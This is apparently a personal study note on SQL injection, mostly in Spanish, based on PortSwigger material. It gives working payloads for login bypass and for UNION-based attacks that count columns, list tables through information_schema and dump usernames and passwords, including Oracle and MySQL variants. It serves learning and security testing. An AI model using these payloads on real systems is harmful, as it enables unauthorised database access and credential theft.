
# SQL Inyeccion

> SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database

## SQL injection examples

### Retrieving hidden data

Por ejemplo cuando se usa ' or 1=1-- 

> SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

En esta consulta muestras todos los datos ya que comentas lo que sigue despues de --

> The modified query will return all items where either the category is Gifts, or 1 is equal to 1. Since 1=1 is always true, the query will return all items.

### Subverting application logic


If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

Here, an attacker can log in as any user without a password simply by using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:


> SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

Inyectando comentaria la otra parte

> SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

Entonces si logramos comentar el and con '--

### Retrieving data from other database tables ( SQL injection UNION attacks )


When an application is vulnerable to SQL injection and the results of the query are returned within the application's responses, the UNION keyword can be used to retrieve data from other tables within the database. This results in an SQL injection UNION attack

***En resumen tienes que lograr esto***

> SELECT a, b FROM table1 UNION SELECT c, d FROM table2

Desde la peticion incial

> SELECT name, description FROM products WHERE category = 'Gifts'

***Restricciones***
Para que UNION funcione tiene que pasar el mismo numero de columnas en el union y tambien deben de manejar el mismo tipo de datos

#### Paso 1 

Ver cuantas columnas tienen esa tabla  se puede hacer por dos metodos 

Metodo 1

*** CTRL + U to url enconde en Burp Suite***

>' ORDER BY 1--

>' ORDER BY 2--

>' ORDER BY 3--

Hasta n cuando de error entonces ya no es valido osea es ir probando.

Metodo 2 

> 'UNION SELECT NULL,NULL,NULL--

Ir probando de igual que order by para ver cuantas columnas esta trabajando esa query

#### Paso 2 

Verificar el tipo de datos que maneja cada columna debe de ser del mismo tipo para que no falle ( si se usa burp url encodear antes de mandar)

>'UNION SELECT NULL,NULL,NULL--
>' UNION SELECT 'abcdef',NULL,NULL--

(falta investigar los datos de la base como nombre de tabla etc) 
#### Enumerar datos de la base de datos

***La mayoría de los tipos de bases de datos con la notable excepción de Oracle***

La mayoría de los tipos de bases de datos (con la notable excepción de Oracle) tienen un conjunto de vistas llamado "information_schema" que proporciona información sobre la base de datos. Por ejemplo las ***tablas***

```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

```
***Ejemplo***

```
'union select TABLE_NAME,null  FROM information_schema.tables--


'union select COLUMN_NAME,null  FROM information_schema.columns WHERE table_name = 'users_feqfcm'--

username_smvbda

password_dabqhh

'union select username_smvbda,password_dabqhh  FROM users_feqfcm--
```

# Metodos para concatenar informacion en una sola columna 

```
union select null,concat(username,':',password) from users-- -
union select null,username||':'||password from users-- -

```



***Para Oracle***





#### Paso 3 

Sacar datos

> ' UNION SELECT username, password FROM users--

### Oracle DB

#### Tabla dual

En el caso de una base de datos ORACLE para la sentencia ***SELECT*** para realizar cualquier query necesitamos decirle a que tabla. Para hacer frente a este problema Oracle creo la tabla dual que es accesible para todos los usuarios.

>In Oracle, the SELECT statement must have a FROM clause. However, some queries don’t require any table for example:
>Fortunately, Oracle provides you with the DUAL table which is a special table that belongs to the schema of the user SYS but it is accessible to all users.
The DUAL table has one column named DUMMY whose data type is VARCHAR2() and contains one row with a value X


```
SELECT * FROM dual;
```

```

'union select 'a',null from dual--

'union select banner,null from v$version--

```

Por o tanto para intentar el ataque de UNION tenemos que llamar a esta tabla o usar el ORDER BY como primer paso pero despues para el segundo paso ***ver que datos tienen esas columnas (STRINGS O NUMEROS) si es que no lo podemos inferir por los datos de la pagina EN la query usamos la tabla dual***. Para sacar la version de oracle lo intuimos al mandar la query y que no nos responda despues mandarla con la tabla dual y que si nos responda.

### MYSQL

Para la base de datos de mysql hay que tener algunas cosideraciones por ejemplo el comentario ya no es -- si no # 
si se puede usar -- pero requiere que se use un espacio al ultimo asi "-- " (sin comillas solo es el ejemplo)

```
'UNION SELECT @@version,NULL#
'union select @@version,null--

```

# Bibliografia o Recursos Consultados

> https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635

>https://portswigger.net/web-security/sql-injection/cheat-sheet

